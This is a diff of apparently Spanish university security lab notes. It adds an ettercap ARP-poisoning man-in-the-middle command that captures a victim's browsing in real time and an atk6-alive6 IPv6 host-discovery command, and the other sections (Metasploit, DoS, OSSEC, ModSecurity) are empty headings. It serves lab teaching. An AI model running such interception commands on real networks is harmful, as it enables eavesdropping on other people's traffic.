@@ -822,18 +822,44 @@ https://www.server-world.info/en/note?os=Debian_12&p=grafana
 
 1. URL visitadas en tiempo real:
 
+Archivo de configuración:
+
 ```
+nano /etc/ettercap/etter.conf
 ```
 
+Comando de ataque: 
+
+```
+ettercap -Tq -M arp:remote -P remote_browser /10.11.48.203// /10.11.48.1// -w /home/lsi/Descargas/apartado_f
+```
+
+El que esta siendo atacado tiene que visitar una web con lynx ( que es el navegador que tenemos puesto en el /etc/ettercap.etter.conf
+
 2. Segmento 2002 y Local-links:
-3. Metasploit:
-4. Filtro ettercap:
-5. Transferencia de zona o similar:
-6. Arpon:
-7. Ossec ( Timeout = 120 seg ):
-8. Ataque DOS:
-9. Mod_Security:
-10. Grafan ( Dashboard 159):
+
+Segmento 2002:
+
+```
+
+```
+
+
+Local-Links:
+
+```
+atk6-alive6 ens33
+```
+
+  
+4. Metasploit:
+5. Filtro ettercap:
+6. Transferencia de zona o similar:
+7. Arpon:
+8. Ossec ( Timeout = 120 seg ):
+9. Ataque DOS:
+10. Mod_Security:
+11. Grafan ( Dashboard 159):
 
 
 
